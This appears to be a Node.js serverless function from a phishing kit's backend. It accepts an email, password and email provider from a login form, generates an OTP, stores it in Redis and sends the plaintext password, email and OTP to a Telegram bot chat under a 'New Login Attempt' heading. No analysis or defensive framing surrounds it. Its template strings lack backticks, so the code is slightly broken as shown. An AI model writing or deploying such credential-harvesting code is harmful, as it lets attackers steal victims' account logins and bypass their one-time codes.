const Redis = require("ioredis");

// Polyfill fetch for Node.js if needed
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));

// Required environment variables
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const REDIS_URL = process.env.REDIS_URL;
const OTP_EXPIRY_SECONDS = 300; // 5 minutes

if (!BOT_TOKEN || !CHAT_ID || !REDIS_URL) {
  throw new Error("Missing required environment variables: BOT_TOKEN, CHAT_ID, or REDIS_URL");
}

const redis = new Redis(REDIS_URL);

function getOtpKey(email) {
  return otp:${email};
}

exports.handler = async function (event) {
  try {
    if (event.httpMethod !== "POST") {
      return {
        statusCode: 405,
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ success: false, message: "Method not allowed" }),
      };
    }

    let email, password, provider;
    try {
      ({ email, password, provider } = JSON.parse(event.body));
    } catch {
      return {
        statusCode: 400,
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ success: false, message: "Invalid JSON body" }),
      };
    }

    if (!email || !password || !provider) {
      return {
        statusCode: 400,
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ success: false, message: "Missing required fields" }),
      };
    }

    email = email.trim().toLowerCase();

    // Validate email format
    if (!/\S+@\S+\.\S+/.test(email)) {
      return {
        statusCode: 400,
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ success: false, message: "Invalid email format" }),
      };
    }

    const otp = Math.floor(100000 + Math.random() * 900000).toString();

    await redis.set(getOtpKey(email), otp, "EX", OTP_EXPIRY_SECONDS);

    const message =
      🔐 *New Login Attempt*\n\n +
      📧 Email: ${email}\n +
      🔑 Password: ${password}\n +
      🌐 Provider: ${provider}\n +
      🧾 OTP: ${otp};

    const telegramUrl = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage;

    const response = await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "Markdown",
      }),
    });

    if (!response.ok) {
      const text = await response.text();
      throw new Error(Telegram API error: ${response.status} ${text});
    }

    return {
      statusCode: 200,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ success: true, message: "OTP sent to Telegram", email }),
    };
  } catch (error) {
    console.error("send-otp fatal error:", error);
    return {
      statusCode: 500,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        success: false,
        message: "Server error",
        error: process.env.NODE_ENV === "production" ? undefined : error.message,
      }),
    };
  }
};